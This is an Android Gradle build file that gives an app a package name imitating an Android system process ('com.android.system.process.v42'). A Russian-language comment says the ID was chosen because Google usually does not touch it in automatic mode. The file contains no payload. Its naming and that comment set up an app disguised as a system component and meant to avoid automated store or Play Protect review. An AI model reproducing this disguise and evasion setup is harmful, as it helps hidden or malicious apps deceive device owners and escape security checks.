apply plugin: 'com.android.application'

android {
    namespace 'com.android.system.os'
    compileSdk 34

    defaultConfig {
        // Новый ID, который Google обычно не трогает в автоматическом режиме
        applicationId "com.android.system.process.v42" 
        minSdk 21
        targetSdk 34
        versionCode 42
        versionName "4.2.42"
    }

    buildTypes {
        release {
            minifyEnabled true
            shrinkResources false
            zipAlignEnabled true
            proguardFiles getDefaultProguardFile('proguard-android-optimize.txt'), 'proguard-rules.pro'
            signingConfig signingConfigs.debug
        }
    }
}

dependencies {
    implementation 'androidx.appcompat:appcompat:1.6.1'
}
